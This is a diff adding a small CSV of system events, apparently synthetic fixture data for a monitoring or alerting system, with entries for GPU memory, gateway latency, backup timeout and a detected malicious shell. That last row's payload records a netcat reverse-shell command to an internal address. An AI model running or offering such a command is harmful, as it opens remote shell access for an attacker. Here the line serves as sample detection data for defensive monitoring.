@@ -1,0 +1,5 @@
+ID,createdAt,createdBy,modifiedAt,modifiedBy,eventType,source,payload,severity
+evt-0000-0000-0000-000000000001,2026-05-26T09:00:00Z,system,2026-05-26T09:00:00Z,system,CUDA_MEMORY_LIMIT,AIEngine,"{""node"":""gpu-node-03"",""gpuUsage"":99.4,""alertId"":""alert-vram-01""}",ERROR
+evt-0000-0000-0000-000000000002,2026-05-26T09:10:00Z,system,2026-05-26T09:10:00Z,system,GATEWAY_HIGH_LATENCY,EventEngine,"{""gateway"":""apigw-east-1"",""latencyMs"":2450}",WARNING
+evt-0000-0000-0000-000000000003,2026-05-26T09:20:00Z,system,2026-05-26T09:20:00Z,system,MALICIOUS_SHELL_DETECTED,SECURE,"{""container"":""web-agent-11"",""cmd"":""nc -e /bin/sh 10.99.1.1""}",FATAL
+evt-0000-0000-0000-000000000004,2026-05-26T08:30:00Z,system,2026-05-26T08:30:00Z,system,BACKUP_JOB_TIMEOUT,EventEngine,"{""jobId"":""db-backup-daily"",""durationMinutes"":60}",WARNING
